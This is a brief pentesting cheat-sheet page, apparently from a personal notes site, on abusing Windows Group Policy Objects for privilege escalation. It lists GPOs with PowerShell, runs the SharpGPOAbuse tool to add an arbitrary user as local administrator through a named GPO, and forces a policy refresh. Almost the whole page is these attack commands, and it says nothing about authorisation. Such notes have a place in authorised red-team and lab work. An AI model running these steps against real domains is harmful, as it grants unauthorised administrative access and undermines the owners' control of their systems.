---
title: "GPOs"
date: 2024-8-3
tags: ["GPOs", "Windows", "privesc", "Group Policy Objects"]
---

---
### Abuse #1: Add local admin

#### 1. List GPOs Name

<div>

```powershell
Get-GPO -All | Select-Object DisplayName
```

</div>

#### 2. Add localAdmin

<div>

```powershell
.\SharpGPOAbuse.exe --AddLocalADmin --UserAccount <USER> --GPOName <GPO_NAME>
```

</div>

#### 3. Force reload

<div>

```powershell
gpupdate /force
```

</div>

<small>*Ref: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)*</small>

<br>